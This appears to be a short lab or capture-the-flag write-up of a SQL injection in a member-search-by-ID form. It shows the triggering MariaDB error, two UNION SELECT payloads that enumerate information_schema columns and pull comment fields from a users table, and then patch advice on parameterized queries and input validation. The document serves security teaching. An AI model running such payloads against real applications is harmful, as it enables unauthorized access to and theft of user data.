
# Exploit: SQL Injection in Member Search by ID

## Vulnerability
In the member search by ID section, we observed that inputting `'1'` causes the following error:
```
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '\'1\'' at line 1
```
This indicates that the form is not protected against SQL injection.

## Steps to Exploit
1. To enumerate the fields of the table related to images in the database, use the following payload:
   ```
   1 OR 1=1 UNION SELECT table_name, column_name FROM information_schema.columns
   ```
2. This reveals various fields in the table, such as:
   - `password`
   - `first_name`
   - `name`
   - `user_id`
   - `country`
   - `Commentaire`
   - `id_comment`
   - `comment`
   - ...

3. Using this information, extract sensitive data. For example:
   ```
   1 OR 1=1 UNION SELECT Commentaire, comment FROM users
   ```

## Result
Successfully retrieve sensitive data, exposing user information.

## Patch
To mitigate this vulnerability:
1. Always use parameterized queries (e.g., prepared statements) to handle user inputs securely.
2. Sanitize and validate inputs to ensure only expected data formats are processed.
3. Restrict database permissions to minimize access for user accounts.
4. Regularly audit and test your application for SQL injection vulnerabilities.